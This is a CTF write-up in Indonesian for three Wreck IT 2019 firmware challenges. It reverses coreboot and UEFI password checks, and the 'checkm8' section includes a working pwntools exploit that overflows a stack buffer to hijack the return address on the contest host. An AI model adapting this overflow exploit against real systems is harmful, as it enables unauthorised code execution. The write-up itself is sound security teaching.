---
title: "Wreck IT CTF 2019 Writeup"
description: "Write IT CTF challenges writeup"
pubDate: "September 29 2019"
tags: ["ctf-writeup", "rev", "pwn"]
---

# 1ot

> Setelah galau dengan permasalahan UEFI-nya, kini Bambang beralih mempergunakan sistim perangkat kokoh lainnya yang dirasa lebih mudah. Namun naga-naganya, sistim perangkat kokoh tersebut terproteksi dengan password juga. Bantu Bambang menemukan jawaban. ;)

Sedikit recon pada file yang diberikan dengan membaca headernya dan analisa strings

```sh
$ head -c 32 ./1ot.bin | xxd
00000000: 5f5f 464d 4150 5f5f 0101 0000 c0ff 0000  __FMAP__........
00000010: 0000 0000 4000 464c 4153 4800 0000 0000  [email protected].....
$ strings ./1ot.bin
...
CBFS: Locating '%s'
CBFS: Found @ offset %zx size %zx
CBFS: '%s' not found.
coreboot-%s%s %s romstage starting (log level: %i)...
0123456789abcdef
0123456789ABCDEF
...
```

dengan google-fu, `FMAP` ini ternyata flashmap files, “flashmap, a firmware layout description format allowing to have multipleCBFSes”. dan ada string `coreboot`, OSS project untuk firmware bios. Untuk extract file bios ini, saya mengikuti langkah-langkah dari [Hacking VMX Support Into Coreboot#Extracting The BIOS](https://www.chromium.org/chromium-os/developer-information-for-chrome-os-devices/samsung-sandy-bridge/coreboot-vmx-hack#TOC-Extracting-The-BIOS).

```sh
$ cbfstool 1ot.bin print
FMAP REGION: COREBOOT
Name                           Offset     Type           Size   Comp
cbfs master header             0x0        cbfs header        32 none
fallback/romstage              0x80       stage           11388 none
fallback/ramstage              0x2d80     stage           44959 none
config                         0xdd80     raw               485 none
revision                       0xdfc0     raw               674 none
cmos_layout.bin                0xe2c0     cmos_layout       548 none
fallback/postcar               0xe540     stage            9192 none
fallback/dsdt.aml              0x10980    raw              4021 none
fallback/payload               0x11980    simple elf      21566 none
(empty)                        0x16e00    null          4083608 none
bootblock                      0x3fbdc0   bootblock       16384 none
$ cbfstool coreboot.bin extract -f payload -n fallback/payload -m x86
Found file fallback/payload at 0x11980, type simple elf, compressed 21566, size 21566
$ file payload
payload: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped
```

Buka file ELF tersebut pada IDA, pada tab strings-nya (Shift+F12) terdapat string `password` ![strings](/img/wreckit-iot-strings.png) Cari xref-nya untuk string tersebut, ![strings](/img/wreckit-iot-pwdxref.png) berikut hasil dekompilasi dari `sub_4002571`

```c
void __cdecl __noreturn sub_4002571(int a1) {
  maybe_printf_4003CF0("Password : ");
  qmemcpy(v8, flag_const_4007E20, 0x33u);
  input = (char *)maybe_alloc_4002F62(480);
  check = 0;
  for ( i = 0; i < 0x33 && input[i] == 13; ++i ) {
    input[i] = maybe_input_4003E63();
    xor = gen_key_4004AAF() % 256 ^ input[i];
    maybe_printf_4003CF0("%c", input[i]);
    if ( xor != flag_const_4007E20[i] || i > 21 )
      check = 1;
  }
  if ( check )
    msg = "\n\nNope..!";
  else
    msg = "\n\nBetul, 100! itu flagnya ;)";
  maybe_printf_4003CF0(msg);
  halt_40000A0();
}
```

Logika pengecekan password sudah jelas, input dicek dengan `flag_const_...[] ^ gen_key()`. Kalau begitu tinggal buat solvernya,

```c
#include <stdio.h>

int seed = 1;
unsigned char flag[] = { // from flag_const_4007E20
    0xD4, 0xD4, 0xE0, 0x68, 0x60, 0xED, 0x46, 0x4B, 0x11, 0x92,
    0x4F, 0xC5, 0xF8, 0xC8, 0x7A, 0x3E, 0x66, 0xB8, 0xAB, 0xF9,
    0xEF, 0x00, 0x00, 0x00, 0x00, 0xD4, 0xD4, 0xE0, 0x68, 0x60,
    0xED, 0x46, 0x4B, 0x11, 0x92, 0x4F, 0xC5, 0xF8, 0xC8, 0x7A,
    0x3E, 0x66, 0xB8, 0xAB, 0xF9, 0xEF, 0x00, 0x00, 0x00, 0x00,
    0x00
};

int gen_key(int *seed) {
  *seed = 0x41C64E6D * *seed + 0x3039;
  return *seed;
}

int main(int argc, char const *argv[]) {
  for (int i = 0; i < 20; ++i) printf("%c", flag[i] ^ (gen_key(&seed) % 256));
  return 0;
}
```

Flag: `wreck{r3tURnFroMc0r3bO0ooT}`

# checkm8

> Masih ingat dengan Bambang si tukang pencari password?Ternyata Bambang adalah agen telik sandi, Kali ini bambang ditugaskan untuk melakukan penetrasi terhadap jaringan DoD untuk menguak rahasia Area404. Melalui proses recon yang cukup panjang, akhirnya bambang berhasil mendapatkan perangkat lunak yg sama, yang digunakan pada sistim target. Bantu bambang, menemukan celah dan mengeksploitasi perangkat lunak tersebut. sasaran Bambang yang kami ketahui berada pada: checkm8.wreck-it.seclab.id:1337

Masih sama dengan `1ot`, file ‘iBoot.rom’ ini adalah coreboot BIOS, bedanya kali ini harus melakukan binary exploitation pada firmware ini. Berikut hasil dekompilasi fungsi cek password,

```c
int sub_53C262()
{
  int v0; // edi
  _BYTE *v1; // ebx
  int v2; // ST1C_4
  int v3; // edx
  char v5; // [esp+24h] [ebp-20h]

  maybe_printf_53FCD5("Password : ");
  v0 = maybe_alloc_53F166(256, 4);
  v1 = (_BYTE *)v0;
  do
  {
    v2 = gen_key_540A94();
    v3 = maybe_input_53FE48() ^ v2 % 256;
    *v1++ = v3;
  }
  while ( (_BYTE)v3 != 13 );
  strcpy_54002D((int)&v5, v0);
  if ( !strcmp_53FFA8(&v5, &dword_54452C) )
    maybe_printf_53FCD5("\nerr.. ;)\n");
  return 0;
}
```

terdapat bufferoverflow pada `v0` karena input tidak dibatasi masksimal sebesar alokasi awal `v0`. Selanjutnya `v0` ini di copy ke `v5` dengan `strcpy_54002D(v5, v0)`. Bug ini lah yang membuat eksploitasi ini menjadi trivial karena variabel di stack ini `v5` hanya sebesar `0x20` sedangkan input `v0` yang tidak terbatas. Eksploitasi bisa dilakukan adalah mengubah saved return address ke fungsi yang mencetak flag, `sub_53C24E`.

solver,

```py
#!/usr/bin/env python
from pwn import *

HOST = 'checkm8.wreck-it.seclab.id'
PORT = 1337

def gen_key(n):
    p = 1
    k = [1]
    for i in range(n):
        k.append((0x41C64E6D * k[i] + 0x3039) % 256)
    return k[1:] # delete k[0]

def xor(k, s):
    f = ''
    for i in range(len(s)):
        f += chr(ord(s[i]) ^ k[i % len(k)])
    return f

def exploit(REMOTE):
    payload = p32(0x1DABC153) # password
    payload += 'A' * 0x20
    payload += p32(0x53C24E) # print_flag
    payload += p8(13)
    k = gen_key(len(payload))
    payload = xor(k, payload)
    r.sendafter(' : ', payload)

if __name__ == '__main__':
    REMOTE = len(sys.argv) > 1
    r = remote(HOST, PORT)
    exploit(REMOTE)
    r.interactive()
```

```sh
$ python2 solve.py
[+] Opening connection to checkm8.wreck-it.seclab.id on port 1337: Done
[*] Switching to interactive mode
wreck{m4Yb3_w3_Shl0ud_T4lk_brO}Invalid Opcode Exception
Error code: n/a
EIP:    0x07febfd9
CS:     0x0018
GS:     0x0018
Dumping stack:
0x58f260: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
0x58f240: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
0x58f220: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
0x58f200: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
0x58f1e0: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
0x58f1c0: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
0x58f1a0: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
0x58f180: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
0x58f160: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
0x58f140: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
0x58f120: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
0x58f100: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
0x58f0e0: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
0x58f0c0: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
0x58f0a0: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
0x58f080: 00000000 00000000 0053c24c 07febf78 00000000 00000000 00000000 00000000
0x58f060: 41414141 41414141 41414141 41414141 07febfd9 00000010 00000046 0053e7f4
```

Flag: `wreck{m4Yb3_w3_Shl0ud_T4lk_brO}`

Sedikit cerita, `checkm8` ini adalah bootrom exploit yang baru saja keluar untuk apples SoC yang menggunakan UaF bug pada bagian usb. Saya sempat “tersasar” beberapa saat dalam mengerjakan ini untuk mencari tahu internal mm (memory management) untuk coreboot dahulu karena mungkin saja, `checkm8` di soal ini juga memerlukan uaf. F.

# Sehnsucht

> Bambang merasa galau karena dia lupa password UEFI servernya yang berada di Antartika. Bantu bambang menyelesaikan permasalahan berat hidupnya ini. Terima Kasih.
>
> Note: Saya solve soal ini setelah lomba berakhir

Dari hint dan deskripsi soal dapat diketahui file yang diberikan adalah firmware UEFI, mengingat beberapa bulan lalu ada soal yang sama juga mengenai UEFI di Google CTF Quals, saya menggunakan writeup [Google CTF Quals - SecureBoot](https://github.com/EmpireCTF/empirectf/tree/master/writeups/2019-06-22-Google-CTF-Quals#271-Pwn--SecureBoot) untuk _kickstart_ awal reversing.

Buka file dengan `uefitool` dan extract body dari `UiApp`, ![uiapp](/img/wreckit-sehnsucht-uefitool.png)

Lanjut ke analisa file hasil extract tadi (`uiapp.dll`), mencoba strings dengan beberapa encoding tidak memberikan hasil apa-apa saat mencari untuk string “Password”.

Sesuai dengan referensi writeup yang ditulis di atas untuk mempermudah reversing, fix type data (shortcut key: y) variable global yang diinisialisasi pada `ModuleEntryPoint(EFI_HANDLE *ImageHandle, EFI_SYSTEM_TABLE *SystemTable)`. berikut hasilnya (Ini terletak pada bagian awal fungsi tersebut),

```c
EFIHandle = (EFI_HANDLE *)ImageHandle;
v2 = SystemTable->RuntimeServices;
EFISystemTable = SystemTable;
v3 = SystemTable->BootServices;
EFIRuntimeServices = v2;
EFIBootServices = v3;
```

Selanjutnya saya mencari fungsi mana yang melakukan print string Password satu per satu, bagian ini ditemukan pada `sub_240()`.

```c
EFISystemTable->ConOut->ClearScreen(EFISystemTable->ConOut);
v124 = maybe_alloc_8926(800);
v118 = (__int16 *)maybe_alloc_8926(800);
v1 = (__int16 *)maybe_alloc_8926(800);
do
{
  v24 = v0 * 2;
  v118[v0] = word_1172C[v0] ^ 5;
  do
  {
    v25 = word_11744[v24];
    if ( v24 % 3 )
    {
      if ( v24 % 3 == 2 )
        LOBYTE(v25) = v25 ^ 0xC1;
      else
        LOBYTE(v25) = v25 ^ 0xAB;
    }
    else
    {
      v25 ^= 0x53u;
    }
    v1[v24] = v25;
    v1[v24] ^= 0x12u;
    ++v24;
  }
  while ( v24 != v0 * 2 + 2 );
  ++v0;
}
while ( v0 != 11 );
v26 = (int)&input_from_readkeystroke_v151;
maybe_printf_8CA8((const char *)L"%s", v118);
sub_8739();
v28 = v124;
do
{
  while ( ((int (__cdecl *)(EFI_SIMPLE_TEXT_INPUT_PROTOCOL *, int *, int, int))EFISystemTable->ConIn->ReadKeyStroke)(
            EFISystemTable->ConIn,
            &input_from_readkeystroke_v151,
            v27,
            v27) )
    ;
  v28 += 2;
  *(_WORD *)(v28 - 2) = HIWORD(input_from_readkeystroke_v151) ^ 0x12;
  ((void (__cdecl *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int16 *, int, int))EFISystemTable->ConOut->OutputString)(
    EFISystemTable->ConOut,
    &str_bintang,                             // "*"
    v29,
    v29);
}
while ( HIWORD(v151) != 13 );
```

Kalau diteliti lagi bagian ini sebenarnya melakukan,

    1. clear screen
    2. `printf("%s", v118)`, v118 ini bisa jadi string password
    3. `ReadKeyStroke(..., &v151, ...` dan menyimpannya ke `v124 + off = v151`, `v124` ini bisa jadi input password
    4. setelah input tadi, yang print hanya "*" (simbol bintang)

dan ini pas banget untuk apa yang dilakukan saat menjalakan filenya dengan qemu setelah memberi input exit pada UEFI shell.

Untuk membuktikan asumsi tadi, coba buat bagian tadi ke C,

```c
#include <stdio.h>

char word_1172C[] = {85, 100, 118, 118, 114, 106, 119, 97, 37, 63, 37, 0};
char word_11744[] = {3,  235, 244, 102, 223, 174, 36, 217, 242, 48, 224, 240,
                     39, 235, 178, 96,  200, 173, 50, 201, 240, 23, 0};

int main(int argc, char const *argv[]) {
  char v1[100] = {0};
  char v118[100] = {0};

  int v0 = 0;
  do {
    int v24 = v0 * 2;
    v118[v0] = word_1172C[v0] ^ 5;
    do {
      char v25 = word_11744[v24];
      if (v24 % 3) {
        if (v24 % 3 == 2)
          v25 = v25 ^ 0xC1;
        else
          v25 = v25 ^ 0xAB;
      } else {
        v25 ^= 0x53u;
      }
      v1[v24] = v25;
      v1[v24++] ^= 0x12u;
    } while (v24 != v0 * 2 + 2);
    ++v0;
  } while (v0 != 11);

  printf("%s", v118);
  return 0;
}
```

compile lalau jalankan programnya,

```sh
$ gcc solve.c -o solve
$ ./solve
Password :
```

Yep, asumsi awal kita benar dengan begitu, `v124` ini adalah input dari password. Cari xref nya untuk mendapatkan dimana input dicek,

![v124 xref](/img/wreckit-sehnsucht-v124xref.png)

basic block `if` ini sebenarnya sudah menandakan tanda bagus kalau `v124` sedang dicek terhadap variabel lain, plus fungsi `sub_902A` ini sebenarnya `strncmp`, berikuta hasil dekompilasinya,

```c
int __cdecl sub_902A(unsigned __int16 *a1, _WORD *a2, unsigned int a3)
{
  unsigned __int16 *v3; // edi
  _WORD *v4; // edx
  unsigned int i; // esi
  int v6; // eax

  v3 = a1;
  v4 = a2;
  for ( i = a3; ; --i )
  {
    v6 = *v3;
    if ( !(_WORD)v6 || *v4 == 0 || (_WORD)v6 != *v4 || i <= 1 )
      break;
    ++v3;
    ++v4;
  }
  return v6 - (unsigned __int16)*v4;
}
```

dengan begitu, `sub_902A(v124, v1, 0x16u)` adalah `strncmp(v124, v1, 0x16u)`. Kalau lihat lagi ke hasil dekompilasi IDA atau pada `solve.c`, `v1` ini diinisialisasi berbarengan dengan string password (`v118`) dan input dixor dengan 0x12 (`*(_WORD *)(v28 - 2) = HIWORD(input_from_readkeystroke_v151) ^ 0x12;`),

Jadi, sekarang hanya perlu mengubah `solve.c` tadi untuk print `v1` tanpa dixor dengan 0x12 pada akhirnya. Berikut hasilnya,

```c
#include <stdio.h>

short word_1172C[] = {85, 100, 118, 118, 114, 106, 119, 97, 37, 63, 37, 0};
char word_11744[] = {3,  235, 244, 102, 223, 174, 36, 217, 242, 48, 224, 240,
                     39, 235, 178, 96,  200, 173, 50, 201, 240, 23, 0};

int main(int argc, char const *argv[]) {
  char v1[100] = {0};
  char v118[100] = {0};

  int v0 = 0;
  do {
    int v24 = v0 * 2;
    v118[v0] = word_1172C[v0] ^ 5;
    do {
      char v25 = word_11744[v24];
      if (v24 % 3) {
        if (v24 % 3 == 2)
          v25 = v25 ^ 0xC1;
        else
          v25 = v25 ^ 0xAB;
      } else {
        v25 ^= 0x53u;
      }
      v1[v24++] = v25;
      // v1[v24++] ^= 0x12u;
    } while (v24 != v0 * 2 + 2);
    ++v0;
  } while (v0 != 11);

  printf("%s", v1);
  return 0;
}
```

![solve](/img/wreckit-sehnsucht-solve.png)

Flag: `wreck{Ea5y_U3f1_t34s3_4_Qua15s}`
